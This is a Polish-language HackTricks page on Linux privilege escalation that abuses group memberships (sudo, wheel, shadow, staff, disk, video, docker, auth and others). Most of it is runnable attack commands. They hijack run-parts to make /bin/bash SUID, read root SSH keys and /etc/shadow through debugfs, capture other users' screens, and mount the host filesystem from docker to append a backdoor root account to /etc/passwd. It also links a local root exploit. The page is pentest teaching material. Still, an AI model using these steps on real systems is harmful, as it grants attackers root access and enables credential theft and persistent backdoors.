# Interesujące grupy - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Grupy Sudo/Admin

### **PE - Method 1**

**Czasami**, **domyślnie (lub ponieważ wymaga tego niektóre oprogramowanie)** w pliku **/etc/sudoers** można znaleźć niektóre z tych linii:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Oznacza to, że **każdy użytkownik należący do grupy sudo lub admin może wykonywać dowolne polecenia za pomocą sudo**.

Jeśli tak jest, aby **zostać rootem, wystarczy wykonać**:
```
sudo su
```
### PE - Method 2

Znajdź wszystkie pliki binarne suid i sprawdź, czy znajduje się wśród nich plik binarny **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Jeśli stwierdzisz, że plik binarny **pkexec jest plikiem binarnym SUID** i należysz do grupy **sudo** lub **admin**, prawdopodobnie możesz wykonywać pliki binarne z uprawnieniami sudo za pomocą `pkexec`.\
Dzieje się tak, ponieważ zazwyczaj są to grupy uwzględnione w **polityce polkit**. Polityka ta zasadniczo określa, które grupy mogą używać `pkexec`. Sprawdź ją za pomocą:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Znajdziesz tam informacje o tym, które grupy mogą wykonywać **pkexec**, a **domyślnie** w niektórych dystrybucjach Linuksa występują grupy **sudo** i **admin**.

Aby **zostać rootem, możesz wykonać**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Jeśli spróbujesz wykonać **pkexec** i otrzymasz ten **błąd**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**To nie dlatego, że nie masz uprawnień, lecz dlatego, że nie jesteś połączony bez GUI**. Obejście tego problemu znajduje się tutaj: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrzebujesz **2 różnych sesji ssh**:<sup>[[1]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Grupa wheel

**Czasami**, **domyślnie** w pliku **/etc/sudoers** można znaleźć następującą linię:
```
%wheel	ALL=(ALL:ALL) ALL
```
Oznacza to, że **każdy użytkownik należący do grupy wheel może wykonywać dowolne polecenia za pomocą sudo**.

Jeśli tak jest, aby **zostać rootem, wystarczy wykonać**:
```
sudo su
```
## Grupa shadow

Użytkownicy z **grupy shadow** mogą **odczytywać** plik **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Zatem przeczytaj plik i spróbuj **crack some hashes**.

Krótka uwaga dotycząca stanu blokady podczas analizy hashy:
- Wpisy zawierające `!` lub `*` są zazwyczaj nieinteraktywne w przypadku logowania za pomocą hasła.
- `!hash` zwykle oznacza, że hasło zostało ustawione, a następnie zablokowane.
- `*` zwykle oznacza, że nigdy nie ustawiono prawidłowego hasha hasła.
Jest to przydatne przy klasyfikowaniu kont, nawet gdy bezpośrednie logowanie jest zablokowane.

## Grupa Staff

**staff**: Umożliwia użytkownikom dodawanie lokalnych modyfikacji do systemu (`/usr/local`) bez konieczności posiadania uprawnień root (należy pamiętać, że pliki wykonywalne w `/usr/local/bin` znajdują się w zmiennej PATH każdego użytkownika i mogą „zastępować” pliki wykonywalne o tej samej nazwie w `/bin` i `/usr/bin`). Porównaj z grupą „adm”, która jest bardziej związana z monitorowaniem i bezpieczeństwem. [\[source\]](https://wiki.debian.org/SystemGroups)<sup>[[2]](#references)</sup>

W dystrybucjach debian zmienna `$PATH` pokazuje, że `/usr/local/` będzie uruchamiany z najwyższym priorytetem, niezależnie od tego, czy jesteś użytkownikiem uprzywilejowanym.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Jeśli możemy przejąć niektóre programy w `/usr/local`, możemy łatwo uzyskać root.

Przejęcie programu `run-parts` to łatwy sposób na uzyskanie root, ponieważ wiele programów uruchamia `run-parts` (np. crontab i logowanie przez ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
lub po zalogowaniu do nowej sesji SSH.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Grupa Disk

To uprawnienie jest niemal **równoważne z dostępem root**, ponieważ umożliwia dostęp do wszystkich danych znajdujących się na maszynie.

Pliki:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Zauważ, że za pomocą debugfs można również **zapisywać pliki**. Na przykład, aby skopiować `/tmp/asd1.txt` do `/tmp/asd2.txt`, możesz wykonać:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Jednak jeśli spróbujesz **zapisywać pliki należące do root** (takie jak `/etc/shadow` lub `/etc/passwd`), otrzymasz błąd "**Permission denied**".

## Grupa Video

Za pomocą polecenia `w` możesz sprawdzić, **kto jest zalogowany do systemu**. Wyświetli ono dane podobne do poniższych:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** oznacza, że użytkownik **yossi jest fizycznie zalogowany** do terminala na maszynie.

Grupa **video** ma dostęp do wyświetlanego obrazu. Zasadniczo można obserwować zawartość ekranów. Aby to zrobić, należy **pobrać bieżący obraz ekranu** w postaci surowych danych oraz uzyskać rozdzielczość używaną przez ekran. Dane ekranu mogą być zapisane w `/dev/fb0`, a rozdzielczość tego ekranu można znaleźć w `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Aby **otworzyć** **raw image**, możesz użyć **GIMP**, wybrać plik **`screen.raw`** i jako typ pliku wybrać **Raw image data**:

![Grupa Disk - Grupa Video: Aby otworzyć raw image, możesz użyć GIMP, wybrać plik screen.raw i jako typ pliku wybrać Raw image data](<../../../images/image (463).png>)

Następnie zmień Width i Height na wartości używane na ekranie i sprawdź różne Image Types (wybierając ten, który najlepiej wyświetla ekran):

![Grupa Disk - Grupa Video: Następnie zmień Width i Height na wartości używane na ekranie i sprawdź różne Image Types (wybierając ten, który najlepiej wyświetla ekran)](<../../../images/image (317).png>)

## Grupa root

Wygląda na to, że domyślnie **members of root group** mogą mieć dostęp do **modyfikowania** niektórych plików konfiguracyjnych **service**, niektórych plików **libraries** lub **innych interesujących rzeczy**, które mogą zostać wykorzystane do eskalacji uprawnień...

**Sprawdź, które pliki członkowie root mogą modyfikować**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Grupa Docker

Możesz **zamontować główny system plików maszyny hosta w woluminie instancji**, dzięki czemu po uruchomieniu instancja natychmiast załaduje `chroot` do tego woluminu. W praktyce daje to uprawnienia root na tej maszynie.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Na koniec, jeśli nie podobają Ci się żadne z wcześniejszych sugestii lub z jakiegoś powodu nie działają (docker api firewall?), zawsze możesz spróbować **uruchomić uprzywilejowany kontener i uciec z niego**, jak wyjaśniono tutaj:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Jeśli masz uprawnienia zapisu do docker socket, przeczytaj [**ten post o tym, jak eskalować uprawnienia poprzez wykorzystanie docker socket**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Grupa lxc/lxd

{{#ref}}
./
{{#endref}}

## Grupa Adm

Zwykle **członkowie** grupy **`adm`** mają uprawnienia do **odczytu plików logów** znajdujących się w _/var/log/_.\
Dlatego, jeśli przejąłeś użytkownika należącego do tej grupy, zdecydowanie powinieneś **sprawdzić logi**.

## Grupy Backup / Operator / lp / Mail

Grupy te często stanowią wektory **credential-discovery**, a nie bezpośrednie wektory uzyskania uprawnień root:
- **backup**: może ujawniać archiwa zawierające konfiguracje, klucze, zrzuty baz danych lub tokeny.
- **operator**: zależny od platformy dostęp operacyjny, który może leakować poufne dane runtime.
- **lp**: kolejki/składy wydruków mogą zawierać treść dokumentów.
- **mail**: składy pocztowe mogą ujawniać linki resetujące, OTP oraz wewnętrzne dane uwierzytelniające.

Traktuj członkostwo w tych grupach jako wartościowe znalezisko związane z ujawnieniem danych i wykonuj pivot poprzez ponowne użycie haseł/tokenów.

## Grupa Auth

W OpenBSD grupa **auth** zwykle może zapisywać w folderach _**/etc/skey**_ i _**/var/db/yubikey**_, jeśli są używane.\
Uprawnienia te mogą zostać wykorzystane za pomocą poniższego exploita do **eskalacji uprawnień** do root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

## Odnośniki

- [1] [uwierzytelnianie pkexec/pkttyagent bez sesji GUI (issue #18012 NixOS)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)

{{#include ../../../banners/hacktricks-training.md}}
